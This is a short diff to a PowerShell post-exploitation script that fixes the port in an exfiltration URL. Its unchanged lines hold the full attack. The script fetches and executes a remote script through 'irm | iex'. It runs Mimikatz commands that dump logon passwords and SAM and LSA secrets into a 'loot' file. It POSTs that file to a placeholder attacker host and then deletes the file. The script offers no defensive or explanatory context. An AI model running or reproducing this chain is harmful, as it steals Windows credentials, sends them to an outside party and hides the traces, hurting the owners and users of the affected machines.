@@ -1,5 +1,5 @@
 irm http://<ip>:<port>/m.ps1 -usebasicparsing | iex; Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "exit"' > $env:TEMP\loot.txt
-$url = "http://<ip>:<port>9001/"
+$url = "http://<ip>:<port>/"
 $file = "$env:TEMP\loot.txt"
 Invoke-WebRequest -Uri $url -Method POST -InFile $file
 Remove-Item -Path $file -Force
